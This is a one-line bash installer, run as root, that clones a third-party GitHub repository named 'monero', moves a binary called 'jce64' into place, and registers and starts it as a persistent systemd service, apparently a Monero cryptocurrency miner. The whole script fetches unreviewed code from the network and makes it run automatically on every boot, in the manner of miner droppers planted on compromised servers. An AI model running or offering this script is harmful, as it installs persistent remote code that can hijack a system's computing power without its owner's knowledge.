#!/bin/bash

apt-get -y update && apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git && cd /root && git clone https://github.com/nokian5500/monero.git && cd monero && chmod +x jce64 && mv jce64.service /lib/systemd/system/ && systemctl daemon-reload && systemctl enable jce64.service && systemctl start jce64.service
